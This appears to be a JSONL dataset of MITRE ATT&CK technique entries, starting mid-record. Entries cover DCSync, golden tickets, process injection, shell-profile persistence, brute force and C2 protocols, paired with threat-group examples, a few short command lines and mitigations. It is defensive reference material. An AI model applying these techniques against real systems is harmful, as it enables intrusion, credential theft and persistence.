"Right-to-Left Override", "entity": "Right-to-Left Override", "entity_type": "techniques", "entity_context": ["BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware.", "Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.", "BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.", "Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.", "Ferocious Kitten has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones."], "is_subtechnique": true}
{"text": " Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely. Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.", "idx": "https://attack.mitre.org/techniques/T1037", "title": "Boot or Logon Initialization Scripts", "entity": "Boot or Logon Initialization Scripts", "entity_type": "techniques", "entity_context": ["Restrict write access to logon scripts to specific administrators.", "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence.", "Rocke has installed an \"init.d\" startup script to maintain persistence.\t"], "is_subtechnique": false}
{"text": " Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image) An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.", "idx": "https://attack.mitre.org/techniques/T1612", "title": "Build Image on Host", "entity": "Build Image on Host", "entity_type": "techniques", "entity_context": ["Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.", "Ensure containers are not running as root by default.", "Audit images deployed within the environment to ensure they do not contain any malicious components.", "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API on port 2375. Instead, communicate with the Docker API over TLS on port 2376."], "is_subtechnique": false}
{"text": " Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync. Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)", "idx": "https://attack.mitre.org/techniques/T1003/006", "title": "DCSync", "entity": "DCSync", "entity_type": "techniques", "entity_context": ["Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "Manage the access control list for \"Replicating Directory Changes\" and other permissions associated with domain controller replication.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.", "APT29 leveraged privileged accounts to replicate directory service data with domain controllers.", "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.", "Operation Wocao has used Mimikatz's DCSync to dump credentials from the memory of the targeted system.\t"], "is_subtechnique": true}
{"text": " Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017) In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020) Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.", "idx": "https://attack.mitre.org/techniques/T1074", "title": "Data Staged", "entity": "Data Staged", "entity_type": "techniques", "entity_context": ["Kobalos can write captured SSH connection credentials to a file under the <code>/var/run</code> directory with a <code>.pid</code> extension for exfiltration. ", "Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules."], "is_subtechnique": false}
{"text": " Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection. Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.", "idx": "https://attack.mitre.org/techniques/T1567/001", "title": "Exfiltration to Code Repository", "entity": "Exfiltration to Code Repository", "entity_type": "techniques", "entity_context": ["Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.", "Empire can use GitHub for data exfiltration."], "is_subtechnique": true}
{"text": " Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.", "idx": "https://attack.mitre.org/techniques/T1212", "title": "Exploitation for Credential Access", "entity": "Exploitation for Credential Access", "entity_type": "techniques", "entity_context": ["Update software regularly by employing patch management for internal enterprise endpoints and servers.", "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist.", "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion.", "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."], "is_subtechnique": false}
{"text": " Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)", "idx": "https://attack.mitre.org/techniques/T1583/004", "title": "Server", "entity": "Server", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.", "GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM."], "is_subtechnique": true}
{"text": " Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access. Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a link through [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application.", "idx": "https://attack.mitre.org/techniques/T1528", "title": "Steal Application Access Token", "entity": "Steal Application Access Token", "entity_type": "techniques", "entity_context": ["A Cloud Access Security Broker (CASB) can be used to set usage policies and manage user permissions on cloud applications to prevent access to application access tokens.", "Administrators can block end-user consent to OAuth applications, disabling users from authorizing third-party apps through OAuth 2.0 and forcing administrative consent for all requests. They can also block end-user registration of applications by their users, to reduce risk. A Cloud Access Security Broker can also be used to ban applications.\n\nAzure offers a couple of enterprise policy settings in the Azure Management Portal that may help:\n\n\"Users -> User settings -> App registrations: Users can register applications\" can be set to \"no\" to prevent users from registering new applications. \n\"Enterprise applications -> User settings -> Enterprise applications: Users can consent to apps accessing company data on their behalf\" can be set to \"no\" to prevent users from consenting to allow third-party multi-tenant applications", "Administrators should perform an audit of all OAuth applications and the permissions they have been granted to access organizational data. This should be done extensively on all applications in order to establish a baseline, followed up on with periodic audits of new or updated applications. Suspicious applications should be investigated and removed.", "APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".", "Users need to be trained to not authorize third-party applications they don’t recognize. The user should pay particular attention to the redirect URL: if the URL is a misspelled or convoluted sequence of words related to an expected service or SaaS application, the website is likely trying to spoof a legitimate service. Users should also be cautious about the permissions they are granting to apps. For example, offline access and access to read emails should excite higher suspicions because adversaries can utilize SaaS APIs to discover credentials and other sensitive communications."], "is_subtechnique": false}
{"text": " Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser. Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.", "idx": "https://attack.mitre.org/techniques/T1217", "title": "Browser Bookmark Discovery", "entity": "Browser Bookmark Discovery", "entity_type": "techniques", "entity_context": ["Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets.", "MobileOrder has a command to upload to its C2 server victim browser bookmarks.", "Chimera has used <code>type \\\\<hostname>\\c$\\Users\\<username>\\Favorites\\Links\\Bookmarks bar\\Imported From IE\\*citrix*</code> for bookmark discovery.", "Machete retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers. ", "Empire has the ability to gather browser data such as bookmarks and visited sites.", "APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.", "Dtrack can retrieve browser history.", "Calisto collects information on bookmarks from Google Chrome."], "is_subtechnique": false}
{"text": " Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe) Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)", "idx": "https://attack.mitre.org/techniques/T1218/012", "title": "Verclsid", "entity": "Verclsid", "entity_type": "techniques", "entity_context": ["Hancitor has used verclsid.exe to download and execute a malicious script.", "Use application control configured to block execution of verclsid.exe if it is not required for a given system or network to prevent potential misuse by adversaries.", "Consider removing verclsid.exe if it is not necessary within a given environment.", "Consider modifying host firewall rules to prevent egress traffic from verclsid.exe."], "is_subtechnique": true}
{"text": " Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL). ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.", "idx": "https://attack.mitre.org/techniques/T1095", "title": "Non-Application Layer Protocol", "entity": "Non-Application Layer Protocol", "entity_type": "techniques", "entity_context": ["WINDSHIELD C2 traffic can communicate via TCP raw sockets.", "TSCookie can use ICMP to receive information on the destination server.", "RainyDay can use TCP in C2 communications.", "Winnti for Linux has used ICMP, custom TCP, and UDP in outbound communications.", "PlugX can be configured to use raw TCP or UDP for command and control.", "Nebulae can use TCP in C2 communications.", "Mis-Type network traffic can communicate over a raw socket.", "HiddenWasp communicates with a simple network protocol over TCP.", "APT29 has used TCP for C2 communications.", "Carbon uses TCP and UDP for C2.", "Misdat network traffic communicates over a raw socket.", "SDBbot has the ability to communicate with C2 with TCP over port 443.", "Remsec is capable of using ICMP, TCP, and UDP for C2.", "SombRAT has the ability to use TCP sockets to send data and ICMP to ping the C2 server.", "If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.", "Pay2Key has sent its public key to the C2 server over TCP.", "PHOREAL communicates via ICMP for C2.", "An APT3 downloader establishes SOCKS5 connections for its initial C2.", "The Regin malware platform can use ICMP to communicate between infected computers.", "FIN6 has used Metasploit Bind and Reverse TCP stagers.", "Crimson uses a custom TCP protocol for C2.\t ", "Taidoor can use TCP for C2 communications.", "The PipeMon communication module can use a custom protocol based on TLS over TCP.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.", "QakBot has the ability use TCP to send or receive C2 packets.", "Bandook has a command built in to use a raw TCP socket. ", "BUBBLEWRAP can communicate using SOCKS.", "Cobalt Strike can be configured to use TCP, ICMP, and UDP for C2 communications.", "LookBack uses a custom binary protocol over sockets for C2 communications.", "WellMail can use TCP for C2 communications.", "Umbreon provides access to the system via SSH or any other protocol that uses PAM to authenticate.", "Anchor has used ICMP in C2 communications.", "Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2.", "Aria-body has used TCP in C2 communications.", "Some variants of FakeM use SSL to communicate with C2 servers.", "InvisiMole has used TCP to download additional modules.", "Operation Wocao has used a custom protocol for command and control.", "PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.", "ShadowPad has used UDP for C2 communications.", "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.", "Cryptoistic can use TCP in communications with C2.", "Filter network traffic to prevent use of protocols across the network boundary that are unnecessary.", "Some Reaver variants use raw TCP for C2.", "MoonWind completes network communication via raw sockets.", "HAFNIUM has used TCP for C2.", "gh0st RAT has used an encrypted protocol within TCP segments to communicate with the C2.", "NETWIRE can use TCP in C2 communications.", "Drovorub can use TCP to communicate between its agent and client modules.", "RARSTONE uses SSL to encrypt its communication with its C2 server.", "Metamorfo has used raw TCP for C2. ", "The Penquin C2 mechanism is based on TCP and UDP packets."], "is_subtechnique": false}
{"text": " Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).", "idx": "https://attack.mitre.org/techniques/T1591/001", "title": "Determine Physical Locations", "entity": "Determine Physical Locations", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git. Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code. Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)", "idx": "https://attack.mitre.org/techniques/T1213/003", "title": "Code Repositories", "entity": "Code Repositories", "entity_type": "techniques", "entity_context": ["Develop and publish policies that define acceptable information to be stored in code repositories.", "APT29 has downloaded source code from code repositories.", "Use multi-factor authentication for logons to code repositories.", "Consider periodic reviews of accounts and privileges for critical and sensitive code repositories. Scan code repositories for exposed credentials or other sensitive information.", "Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization for code repositories."], "is_subtechnique": true}
{"text": " Adversaries may target resource intensive features of web applications to cause a denial of service (DoS). Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself. (Citation: Arbor AnnualDoSreport Jan 2018)", "idx": "https://attack.mitre.org/techniques/T1499/003", "title": "Application Exhaustion Flood", "entity": "Application Exhaustion Flood", "entity_type": "techniques", "entity_context": ["Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies.", "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."], "is_subtechnique": true}
{"text": " Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function) Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM. Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also", "idx": "https://attack.mitre.org/techniques/T1055/011", "title": "Extra Window Memory Injection", "entity": "Extra Window Memory Injection", "entity_type": "techniques", "entity_context": ["Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.", "Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))", "idx": "https://attack.mitre.org/techniques/T1591/003", "title": "Identify Business Tempo", "entity": "Identify Business Tempo", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets) The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.", "idx": "https://attack.mitre.org/techniques/T1558/001", "title": "Golden Ticket", "entity": "Golden Ticket", "entity_type": "techniques", "entity_context": ["Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.", "Ke3chang has used Mimikatz to generate Kerberos golden tickets.", "Empire can leverage its implementation of Mimikatz to obtain and use golden tickets.", "Mimikatz's kerberos module can create golden tickets.", "For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days."], "is_subtechnique": true}
{"text": " Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes. Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.", "idx": "https://attack.mitre.org/techniques/T1110", "title": "Brute Force", "entity": "Brute Force", "entity_type": "techniques", "entity_context": ["Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.", "OilRig has used brute force techniques to obtain credentials.", "Caterpillar WebShell has a module to perform brute force attacks on a system. ", "Chaos conducts brute force attacks against SSH services to gain initial access.", "Fox Kitten has brute forced RDP credentials.", "Turla may attempt to connect to systems within a victim's network using <code>net use</code> commands and a predefined list or collection of passwords.", "APT39 has used Ncrack to reveal credentials.", "Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.", "APT28 can perform brute force attacks to obtain credentials.", "FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.", "Pysa has used brute force attempts against a central management console, as well as some Active Directory accounts.", "DarkVishnya used brute-force attack to obtain login data.", "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.", "Kinsing has attempted to brute force hosts over SSH.", "CrackMapExec can brute force supplied user credentials across a network range.", "Refer to NIST guidelines when creating password policies.", "APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.", "QakBot can conduct brute force attacks to capture credentials.", "PoshC2 has modules for brute forcing local administrator and AD user accounts."], "is_subtechnique": false}
{"text": " Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists) In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016) In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)", "idx": "https://attack.mitre.org/techniques/T1087/003", "title": "Email Account", "entity": "Email Account", "entity_type": "techniques", "entity_context": ["Grandoreiro can parse Outlook .pst files to extract e-mail addresses.", "BoomBox can execute an LDAP query to discover e-mail accounts for domain users.", "TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.", "Emotet has been observed leveraging a module that can scrape email addresses from Outlook.", "Backdoor.Oldrea collects address book information from Outlook.", "MailSniper can be used to obtain account names from Exchange and Office 365 using the <code>Get-GlobalAddressList</code> cmdlet.", "Ruler can be used to enumerate Exchange users and dump the GAL.", "Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.\t", "TrickBot collects email addresses from Outlook."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is", "idx": "https://attack.mitre.org/techniques/T1546/004", "title": "Unix Shell Configuration Modification", "entity": "Unix Shell Configuration Modification", "entity_type": "techniques", "entity_context": ["Linux Rabbit maintains persistence on an infected machine through rc.local and .bashrc files. ", "Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence."], "is_subtechnique": true}
